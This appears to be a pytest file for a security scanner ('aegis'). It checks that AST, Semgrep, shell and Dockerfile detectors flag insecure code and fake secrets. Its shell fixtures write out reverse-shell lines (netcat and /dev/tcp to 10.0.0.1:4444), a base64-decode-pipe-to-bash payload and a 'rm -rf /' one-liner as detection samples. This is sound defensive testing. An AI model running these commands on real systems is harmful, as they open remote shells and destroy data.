"""Tests for hardened AST, Semgrep, Shell, and Dockerfile patterns.

Covers all new patterns added in the hardening sprint:
- AST parser: sys.path manipulation, types.CodeType/FunctionType, mmap, cffi,
  os.setuid/setgid/chroot, os.pipe/dup2, aiofiles, importlib.util
- Semgrep (Python): SSL misuse, deserialization, assert security, tempfile,
  requests timeout, JWT, Jinja2, Flask debug, mark_safe, subprocess shell=True
- Semgrep (JS): setTimeout/setInterval string, postMessage wildcard,
  dangerouslySetInnerHTML, v-html, dynamic import
- Semgrep (Secrets): Azure, Datadog, npm, DigitalOcean, PyPI
- Shell analyzer: base64 decode, inline exec, netcat, chmod 777
- Dockerfile analyzer: ENV/ARG secret detection
"""

import tempfile
from pathlib import Path

import pytest

from aegis.models.capabilities import (
    CapabilityAction,
    CapabilityCategory,
    FindingSeverity,
)
from aegis.scanner.ast_parser import parse_file
from aegis.scanner.dockerfile_analyzer import parse_dockerfile
from aegis.scanner.semgrep_adapter import evaluate_semgrep_rules, load_semgrep_rules
from aegis.scanner.shell_analyzer import parse_shell_file


BUNDLED_RULES_DIR = Path(__file__).parent.parent / "aegis" / "rules" / "semgrep"


def _parse_code(code: str, tmp_path: Path, filename: str = "test.py"):
    """Helper: write code to a file and parse it. Returns (prohibited, restricted, caps, context)."""
    f = tmp_path / filename
    f.write_text(code, encoding="utf-8")
    return parse_file(f, filename)


# ═══════════════════════════════════════════════════════════════════════
#  AST Parser — New Capability Patterns
# ═══════════════════════════════════════════════════════════════════════


class TestASTSysPathManipulation:
    """sys.path.insert/append should be detected as system:sysinfo."""

    def test_sys_path_insert(self, tmp_path: Path):
        prohibited, restricted, caps, _ = _parse_code(
            "import sys\nsys.path.insert(0, '/tmp/malicious')\n", tmp_path
        )
        patterns = [f.pattern for f in restricted]
        assert any("sys.path" in p for p in patterns)

    def test_sys_path_append(self, tmp_path: Path):
        prohibited, restricted, caps, _ = _parse_code(
            "import sys\nsys.path.append('/opt/backdoor')\n", tmp_path
        )
        patterns = [f.pattern for f in restricted]
        assert any("sys.path" in p for p in patterns)


class TestASTCodeObjectConstruction:
    """types.CodeType and types.FunctionType should be detected."""

    def test_types_code_type(self, tmp_path: Path):
        prohibited, restricted, caps, _ = _parse_code(
            "import types\nco = types.CodeType(0, 0, 0, 0, 0, b'', (), (), (), '', '', 0, b'')\n", tmp_path
        )
        patterns = [f.pattern for f in restricted]
        assert any("types.CodeType" in p or "CodeType" in p for p in patterns)

    def test_types_function_type(self, tmp_path: Path):
        prohibited, restricted, caps, _ = _parse_code(
            "import types\nf = types.FunctionType(code_obj, globals())\n", tmp_path
        )
        patterns = [f.pattern for f in restricted]
        assert any("types.FunctionType" in p or "FunctionType" in p for p in patterns)


class TestASTMemoryMappedIO:
    """mmap.mmap should be detected as fs capability."""

    def test_mmap(self, tmp_path: Path):
        prohibited, restricted, caps, _ = _parse_code(
            "import mmap\nwith open('file', 'rb') as f:\n    mm = mmap.mmap(f.fileno(), 0)\n", tmp_path
        )
        patterns = [f.pattern for f in restricted]
        assert any("mmap" in p for p in patterns)


class TestASTCffi:
    """cffi.FFI should be detected."""

    def test_cffi_ffi(self, tmp_path: Path):
        prohibited, restricted, caps, context = _parse_code(
            "from cffi import FFI\nffi = FFI()\n", tmp_path
        )
        # Either import-level or call-level finding
        all_patterns = [f.pattern for f in restricted + context]
        cffi_found = any("cffi" in p.lower() or "ffi" in p.lower() for p in all_patterns)
        # At minimum, the import should be tracked as a capability
        import_cats = {c.category for c in caps}
        assert CapabilityCategory.SYSTEM in import_cats or cffi_found


class TestASTPrivilegeManipulation:
    """os.setuid/setgid/chroot should be detected."""

    def test_os_setuid(self, tmp_path: Path):
        prohibited, restricted, caps, _ = _parse_code(
            "import os\nos.setuid(0)\n", tmp_path
        )
        patterns = [f.pattern for f in restricted]
        assert any("setuid" in p for p in patterns)

    def test_os_chroot(self, tmp_path: Path):
        prohibited, restricted, caps, _ = _parse_code(
            "import os\nos.chroot('/tmp/jail')\n", tmp_path
        )
        patterns = [f.pattern for f in restricted]
        assert any("chroot" in p for p in patterns)


class TestASTFileDescriptorManipulation:
    """os.pipe/dup/dup2 should be detected."""

    def test_os_pipe(self, tmp_path: Path):
        prohibited, restricted, caps, _ = _parse_code(
            "import os\nr, w = os.pipe()\n", tmp_path
        )
        patterns = [f.pattern for f in restricted]
        assert any("pipe" in p for p in patterns)

    def test_os_dup2(self, tmp_path: Path):
        prohibited, restricted, caps, _ = _parse_code(
            "import os\nos.dup2(old_fd, 1)\n", tmp_path
        )
        patterns = [f.pattern for f in restricted]
        assert any("dup2" in p for p in patterns)


class TestASTAiofiles:
    """aiofiles should be tracked as fs capability."""

    def test_aiofiles_open(self, tmp_path: Path):
        prohibited, restricted, caps, _ = _parse_code(
            "import aiofiles\nasync def f():\n    async with aiofiles.open('x') as f:\n        pass\n", tmp_path
        )
        cats = {c.category for c in caps}
        assert CapabilityCategory.FS in cats


class TestASTImportlibUtil:
    """importlib.util.spec_from_file_location should be detected."""

    def test_spec_from_file_location(self, tmp_path: Path):
        prohibited, restricted, caps, _ = _parse_code(
            "import importlib.util\nspec = importlib.util.spec_from_file_location('mod', '/tmp/evil.py')\n", tmp_path
        )
        patterns = [f.pattern for f in restricted]
        assert any("spec_from_file" in p or "importlib" in p for p in patterns)


# ═══════════════════════════════════════════════════════════════════════
#  Semgrep Rules — New Python Rules
# ═══════════════════════════════════════════════════════════════════════


class TestSemgrepNewPythonRules:
    """Test new Python Semgrep rules added in hardening."""

    @pytest.fixture(autouse=True)
    def setup(self):
        self.rules = load_semgrep_rules(BUNDLED_RULES_DIR)
        self.python_rules = [r for r in self.rules if "python" in r.languages]

    def _matches(self, code: str, rule_id: str) -> bool:
        """Check if a code snippet matches a specific rule."""
        prohibited, restricted, caps = evaluate_semgrep_rules(
            Path("test.py"), "test.py", code, "python", self.rules
        )
        all_findings = prohibited + restricted
        return any(rule_id in f.pattern for f in all_findings)

    def test_ssl_unverified_context(self):
        assert self._matches("ctx = ssl._create_unverified_context()", "python-ssl-unverified-context")

    def test_ssl_weak_protocol(self):
        assert self._matches("ssl.PROTOCOL_SSLv3", "python-ssl-weak-protocol")

    def test_ssl_check_hostname_false(self):
        assert self._matches("ctx.check_hostname = False", "python-ssl-check-hostname-false")

    def test_yaml_load_all_unsafe(self):
        assert self._matches("yaml.load_all(data)", "python-yaml-load-all-unsafe")

    def test_marshal_load(self):
        assert self._matches("data = marshal.loads(raw)", "python-marshal-load")

    def test_shelve_open(self):
        assert self._matches("db = shelve.open('data.db')", "python-shelve-open")

    def test_jsonpickle_decode(self):
        assert self._matches("obj = jsonpickle.decode(payload)", "python-jsonpickle-decode")

    def test_dill_load(self):
        assert self._matches("obj = dill.loads(data)", "python-dill-load")

    def test_assert_security_check(self):
        assert self._matches("assert user.is_admin", "python-assert-security-check")

    def test_assert_is_authenticated(self):
        assert self._matches("assert request.user.is_authenticated", "python-assert-security-check")

    def test_tempfile_mktemp(self):
        assert self._matches("fname = tempfile.mktemp()", "python-tempfile-mktemp")

    def test_flask_debug_run(self):
        assert self._matches("app.run(debug=True, port=5000)", "python-flask-debug-run")

    def test_jwt_decode_no_verify(self):
        code = 'jwt.decode(token, options={"verify_signature": False})'
        assert self._matches(code, "python-jwt-decode-no-verify")

    def test_jwt_algorithms_none(self):
        code = 'jwt.decode(token, algorithms=["none"])'
        assert self._matches(code, "python-jwt-algorithms-none")

    def test_jinja2_autoescape_off(self):
        assert self._matches("env = Environment(autoescape=False)", "python-jinja2-autoescape-off")

    def test_django_mark_safe(self):
        assert self._matches("return mark_safe(user_input)", "python-django-mark-safe")

    def test_subprocess_shell_true_string(self):
        code = "subprocess.run('ls -la', shell=True)"
        assert self._matches(code, "python-subprocess-shell-true-string")

    def test_safe_code_no_match(self):
        """Safe code should not trigger any new rules."""
        code = "import json\ndata = json.loads(payload)\n"
        prohibited, restricted, _ = evaluate_semgrep_rules(
            Path("safe.py"), "safe.py", code, "python", self.rules
        )
        all_findings = prohibited + restricted
        new_rule_ids = [
            "python-ssl-unverified-context", "python-ssl-weak-protocol",
            "python-marshal-load", "python-shelve-open", "python-jsonpickle-decode",
            "python-assert-security-check", "python-tempfile-mktemp",
        ]
        for f in all_findings:
            assert not any(rid in f.pattern for rid in new_rule_ids)


# ═══════════════════════════════════════════════════════════════════════
#  Semgrep Rules — New JavaScript Rules
# ═══════════════════════════════════════════════════════════════════════


class TestSemgrepNewJSRules:
    """Test new JavaScript Semgrep rules."""

    @pytest.fixture(autouse=True)
    def setup(self):
        self.rules = load_semgrep_rules(BUNDLED_RULES_DIR)

    def _matches(self, code: str, rule_id: str) -> bool:
        prohibited, restricted, caps = evaluate_semgrep_rules(
            Path("test.js"), "test.js", code, "javascript", self.rules
        )
        all_findings = prohibited + restricted
        return any(rule_id in f.pattern for f in all_findings)

    def test_settimeout_string(self):
        assert self._matches('setTimeout("alert(1)", 1000)', "js-settimeout-string")

    def test_setinterval_string(self):
        assert self._matches('setInterval("doEvil()", 500)', "js-setinterval-string")

    def test_postmessage_wildcard(self):
        assert self._matches('window.postMessage(data, "*")', "js-postmessage-wildcard-origin")

    def test_dangerouslysetinnerhtml(self):
        assert self._matches('dangerouslySetInnerHTML={{__html: data}}', "js-react-dangerouslysetinnerhtml")

    def test_v_html(self):
        assert self._matches('<div v-html="userInput"></div>', "js-vue-v-html")

    def test_new_function_template(self):
        assert self._matches("new Function(`return ${code}`)", "js-new-function-template")

    def test_settimeout_function_ref_no_match(self):
        """setTimeout with function reference should NOT match."""
        assert not self._matches("setTimeout(myFunc, 1000)", "js-settimeout-string")


# ═══════════════════════════════════════════════════════════════════════
#  Semgrep Rules — New Secret Rules
# ═══════════════════════════════════════════════════════════════════════


class TestSemgrepNewSecretRules:
    """Test new generic secret detection rules."""

    @pytest.fixture(autouse=True)
    def setup(self):
        self.rules = load_semgrep_rules(BUNDLED_RULES_DIR)

    def _matches(self, code: str, rule_id: str) -> bool:
        prohibited, restricted, caps = evaluate_semgrep_rules(
            Path("config.txt"), "config.txt", code, "generic", self.rules
        )
        all_findings = prohibited + restricted
        return any(rule_id in f.pattern for f in all_findings)

    def test_azure_storage_connection_string(self):
        code = "DefaultEndpointsProtocol=https;AccountName=myacct;AccountKey=abc123def456ghi789jkl012mno345pqr678stu901v="
        assert self._matches(code, "secret-azure-storage-connection-string")

    def test_datadog_api_key(self):
        code = 'DD_API_KEY=abcdef0123456789abcdef0123456789'
        assert self._matches(code, "secret-datadog-api-key")

    def test_npm_token(self):
        code = "npm_AbCdEfGhIjKlMnOpQrStUvWxYz0123456789"
        assert self._matches(code, "secret-npm-token")

    def test_digitalocean_token(self):
        code = "dop_v1_" + "a" * 64
        assert self._matches(code, "secret-digitalocean-token")

    def test_pypi_token(self):
        code = "pypi-AgEIcHlwaS5vcmcCJDE2ZjUxY2YzLTJhZDktNGU0"
        assert self._matches(code, "secret-pypi-token")


# ═══════════════════════════════════════════════════════════════════════
#  Shell Analyzer — New Prohibited Patterns
# ═══════════════════════════════════════════════════════════════════════


class TestShellNewProhibitedPatterns:
    """Test new shell prohibited patterns."""

    def test_base64_decode_pipe_bash(self, tmp_path: Path):
        script = tmp_path / "evil.sh"
        script.write_text("#!/bin/bash\nbase64 -d payload.b64 | bash\n")
        prohibited, _, _ = parse_shell_file(script, "evil.sh")
        assert any("base64" in f.message.lower() or "encoded" in f.message.lower() for f in prohibited)

    def test_base64_decode_pipe_sh(self, tmp_path: Path):
        script = tmp_path / "evil.sh"
        script.write_text("#!/bin/bash\nbase64 --decode data.txt | sh\n")
        prohibited, _, _ = parse_shell_file(script, "evil.sh")
        assert any("base64" in f.message.lower() or "encoded" in f.message.lower() for f in prohibited)

    def test_python_inline_exec(self, tmp_path: Path):
        script = tmp_path / "evil.sh"
        script.write_text("#!/bin/bash\npython3 -c 'import os; os.system(\"rm -rf /\")'\n")
        prohibited, _, _ = parse_shell_file(script, "evil.sh")
        assert any("python" in f.message.lower() or "inline" in f.message.lower() for f in prohibited)

    def test_perl_inline_exec(self, tmp_path: Path):
        script = tmp_path / "evil.sh"
        script.write_text("#!/bin/bash\nperl -e 'system(\"whoami\")'\n")
        prohibited, _, _ = parse_shell_file(script, "evil.sh")
        assert any("perl" in f.message.lower() for f in prohibited)

    def test_ruby_inline_exec(self, tmp_path: Path):
        script = tmp_path / "evil.sh"
        script.write_text("#!/bin/bash\nruby -e 'exec(\"id\")'\n")
        prohibited, _, _ = parse_shell_file(script, "evil.sh")
        assert any("ruby" in f.message.lower() for f in prohibited)

    def test_netcat_listener(self, tmp_path: Path):
        script = tmp_path / "evil.sh"
        script.write_text("#!/bin/bash\nnc -e /bin/bash 10.0.0.1 4444\n")
        prohibited, _, _ = parse_shell_file(script, "evil.sh")
        assert any("netcat" in f.message.lower() or "reverse" in f.message.lower() for f in prohibited)

    def test_dev_tcp_reverse_shell(self, tmp_path: Path):
        script = tmp_path / "evil.sh"
        script.write_text("#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
        prohibited, _, _ = parse_shell_file(script, "evil.sh")
        assert any("/dev/tcp" in f.message.lower() or "tcp" in f.message.lower() for f in prohibited)

    def test_chmod_777(self, tmp_path: Path):
        script = tmp_path / "evil.sh"
        script.write_text("#!/bin/bash\nchmod 777 /etc/passwd\n")
        prohibited, _, _ = parse_shell_file(script, "evil.sh")
        assert any("chmod" in f.message.lower() or "permissive" in f.message.lower() for f in prohibited)

    def test_chmod_666(self, tmp_path: Path):
        script = tmp_path / "evil.sh"
        script.write_text("#!/bin/bash\nchmod 666 /tmp/sensitive\n")
        prohibited, _, _ = parse_shell_file(script, "evil.sh")
        assert any("chmod" in f.message.lower() or "permissive" in f.message.lower() for f in prohibited)

    def test_safe_script_no_new_prohibitions(self, tmp_path: Path):
        """Normal commands should not trigger new prohibited patterns."""
        script = tmp_path / "safe.sh"
        script.write_text("#!/bin/bash\nchmod 755 app.py\necho 'hello'\nls -la\n")
        prohibited, _, _ = parse_shell_file(script, "safe.sh")
        assert len(prohibited) == 0


# ═══════════════════════════════════════════════════════════════════════
#  Dockerfile Analyzer — ENV/ARG Secret Detection
# ═══════════════════════════════════════════════════════════════════════


class TestDockerfileEnvArgSecrets:
    """Test ENV/ARG secret detection in Dockerfiles."""

    def test_env_with_api_key(self, tmp_path: Path):
        df = tmp_path / "Dockerfile"
        df.write_text("FROM python:3.11\nENV API_KEY=sk_live_abc123\n")
        _, restricted, caps = parse_dockerfile(df, "Dockerfile")
        env_secrets = [f for f in restricted if f.pattern == "dockerfile:env_secret"]
        assert len(env_secrets) >= 1
        assert "API_KEY" in env_secrets[0].message

    def test_env_with_password(self, tmp_path: Path):
        df = tmp_path / "Dockerfile"
        df.write_text("FROM python:3.11\nENV DB_PASSWORD=supersecret123\n")
        _, restricted, caps = parse_dockerfile(df, "Dockerfile")
        env_secrets = [f for f in restricted if f.pattern == "dockerfile:env_secret"]
        assert len(env_secrets) >= 1

    def test_arg_with_secret(self, tmp_path: Path):
        df = tmp_path / "Dockerfile"
        df.write_text("FROM python:3.11\nARG PRIVATE_KEY=ssh-rsa-AAAA...\n")
        _, restricted, caps = parse_dockerfile(df, "Dockerfile")
        arg_secrets = [f for f in restricted if f.pattern == "dockerfile:arg_secret"]
        assert len(arg_secrets) >= 1

    def test_arg_with_token(self, tmp_path: Path):
        df = tmp_path / "Dockerfile"
        df.write_text("FROM python:3.11\nARG AUTH_TOKEN=ghp_abc123def456\n")
        _, restricted, caps = parse_dockerfile(df, "Dockerfile")
        arg_secrets = [f for f in restricted if f.pattern == "dockerfile:arg_secret"]
        assert len(arg_secrets) >= 1

    def test_env_secret_creates_capability(self, tmp_path: Path):
        df = tmp_path / "Dockerfile"
        df.write_text("FROM python:3.11\nENV SECRET=mysupersecret\n")
        _, restricted, caps = parse_dockerfile(df, "Dockerfile")
        secret_caps = [c for c in caps if c.category == CapabilityCategory.SECRET]
        assert len(secret_caps) >= 1

    def test_env_safe_no_match(self, tmp_path: Path):
        """Non-secret ENV vars should not trigger secret detection."""
        df = tmp_path / "Dockerfile"
        df.write_text("FROM python:3.11\nENV PYTHONPATH=/app\nENV PORT=8080\n")
        _, restricted, _ = parse_dockerfile(df, "Dockerfile")
        env_secrets = [f for f in restricted if f.pattern in ("dockerfile:env_secret", "dockerfile:arg_secret")]
        assert len(env_secrets) == 0


# ═══════════════════════════════════════════════════════════════════════
#  Rule Count Verification (regression gate)
# ═══════════════════════════════════════════════════════════════════════


class TestRuleCountRegression:
    """Verify minimum rule counts to prevent accidental removal."""

    def test_bundled_rule_count(self):
        rules = load_semgrep_rules(BUNDLED_RULES_DIR)
        # After hardening: 16 original python + ~18 new python + 15 original JS + ~8 new JS
        # + 19 original generic + ~10 new generic = ~86 total
        assert len(rules) >= 70, f"Expected >= 70 bundled rules, got {len(rules)}"

    def test_python_rules_count(self):
        rules = load_semgrep_rules(BUNDLED_RULES_DIR)
        python_rules = [r for r in rules if "python" in r.languages]
        assert len(python_rules) >= 30, f"Expected >= 30 Python rules, got {len(python_rules)}"

    def test_js_rules_count(self):
        rules = load_semgrep_rules(BUNDLED_RULES_DIR)
        js_rules = [r for r in rules if "javascript" in r.languages]
        assert len(js_rules) >= 20, f"Expected >= 20 JS rules, got {len(js_rules)}"

    def test_generic_rules_count(self):
        rules = load_semgrep_rules(BUNDLED_RULES_DIR)
        generic_rules = [r for r in rules if "generic" in r.languages]
        assert len(generic_rules) >= 25, f"Expected >= 25 generic rules, got {len(generic_rules)}"
